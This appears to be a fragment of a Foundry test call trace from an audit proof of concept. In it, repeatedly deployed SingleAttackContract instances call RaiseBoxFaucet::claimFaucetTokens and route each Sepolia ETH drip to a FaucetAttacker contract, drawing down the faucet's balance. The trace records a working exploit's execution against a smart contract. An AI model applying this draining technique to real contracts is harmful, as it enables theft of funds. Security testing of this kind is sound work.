│   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xAB769D053A71d4897eF0C820aF9157E7406F09D3
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 75) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3264648] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3263889] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3227721] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3220063] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 620000000000000000 [6.2e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xDd4812B4CE6d94bddCD33D7CE7e381f971540324
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 76) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2962679] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2961920] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2925752] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2918094] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 615000000000000000 [6.15e17]
